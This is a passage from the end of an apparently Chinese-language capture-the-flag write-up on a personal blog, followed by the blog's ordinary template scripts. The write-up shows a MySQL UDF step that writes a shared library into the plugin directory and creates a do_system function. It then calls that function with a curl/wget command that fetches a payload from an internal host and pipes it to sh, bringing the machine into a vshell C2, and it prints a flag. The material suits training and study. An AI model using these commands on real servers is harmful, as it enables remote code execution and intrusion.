+<p>mysql连上去插进去，我这个插过了忽略小细节</p>
+<div class="highlight highlight-source-sql"><pre class="notranslate">mysql<span class="pl-k">&gt;</span><span class="pl-k">select</span> unhex(<span class="pl-s"><span class="pl-pds">'</span>7f454c4602010100000000000000000003003e00............<span class="pl-pds">'</span></span>) into dumpfile <span class="pl-s"><span class="pl-pds">'</span>/usr/lib/mysql/plugin/mysqludf.so<span class="pl-pds">'</span></span>;
+
+mysql<span class="pl-k">&gt;</span> CREATE FUNCTION do_system RETURNS <span class="pl-k">INTEGER</span> SONAME <span class="pl-s"><span class="pl-pds">'</span>udf.so<span class="pl-pds">'</span></span>;
+ERROR <span class="pl-c1">1125</span> (HY000): Function <span class="pl-s"><span class="pl-pds">'</span>do_system<span class="pl-pds">'</span></span> already exists
+
+mysql<span class="pl-k">&gt;</span> <span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">FROM</span> <span class="pl-c1">mysql</span>.<span class="pl-c1">func</span> <span class="pl-k">WHERE</span> name<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>do_system<span class="pl-pds">'</span></span>;
+<span class="pl-k">+</span><span class="pl-c"><span class="pl-c">--</span>---------+-----+-------------+----------+</span>
+| name      | ret | dl          | type     |
+<span class="pl-k">+</span><span class="pl-c"><span class="pl-c">--</span>---------+-----+-------------+----------+</span>
+| do_system |   <span class="pl-c1">2</span> | <span class="pl-c1">mysqludf</span>.<span class="pl-c1">so</span> | function |
+<span class="pl-k">+</span><span class="pl-c"><span class="pl-c">--</span>---------+-----+-------------+----------+</span>
+<span class="pl-c1">1</span> row <span class="pl-k">in</span> <span class="pl-k">set</span> (<span class="pl-c1">0</span>.<span class="pl-c1">07</span> sec)
+
+mysql<span class="pl-k">&gt;</span> <span class="pl-k">SELECT</span> do_system(<span class="pl-s"><span class="pl-pds">'</span>(curl -fsSL -m180 http://172.22.14.6:10003/slt||wget -T180 -q http://172.22.14.6:10003/slt)|sh<span class="pl-pds">'</span></span>);
+</pre></div>
+<p>上线下vshell即可</p>
+<h3>flag6</h3>
+<div class="highlight highlight-source-shell"><pre class="notranslate">mysql@project:/tmp$ cat /f2ag06_Aq1aqx.txt 
+flag06: flag{413ac6ad-1d50-47cb-9cf3-17354b751741}</pre></div>
+<h1>齐聚一堂</h1>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/3b1e8e3d-bb77-4440-aaba-d21de44a79b7"><img width="2000" height="362" alt="Image" src="https://github.com/user-attachments/assets/3b1e8e3d-bb77-4440-aaba-d21de44a79b7" style="max-width: 100%; height: auto; max-height: 362px;"></a></p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://faabbi.github.io">MJ</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","faabbi/faabbi.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
